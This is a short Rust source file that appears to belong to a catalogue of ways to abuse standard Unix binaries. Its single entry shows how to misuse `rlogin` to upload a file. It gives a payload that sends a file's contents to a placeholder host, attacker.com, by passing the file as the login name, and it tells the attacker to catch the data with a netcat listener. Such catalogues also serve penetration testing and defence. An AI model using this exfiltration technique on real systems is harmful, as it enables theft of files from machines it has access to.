pub static BIN_NAME: &'static str = "rlogin";
pub static BIN_DESC: &'static str = "Usually `rlogin` is a symlink to `ssh`, the following works only when the real `rlogin` is used (e.g., from the `rsh-client` APT package).";
pub static FU_DESC: &'static str = "Send contents of a file to a TCP port. Run `nc -l -p 12345 > 'file_to_save'` on the attacker system to capture the contents.

`rlogin` hangs waiting for the remote peer to close the socket.

The file is corrupted by leading and trailing spurious data.";
pub static FU_CODE: &'static str = r#"
    
    RHOST=attacker.com
    RPORT=12345
    LFILE=file_to_send
    rlogin -l "$(cat $LFILE)" -p $RPORT $RHOST
"#;
use crate::code::{Code, Tag};
pub static FU: Code<'static> = Code { 
	title: "FU_CODE",
	code: FU_CODE,
	tag: Tag::FU,
};
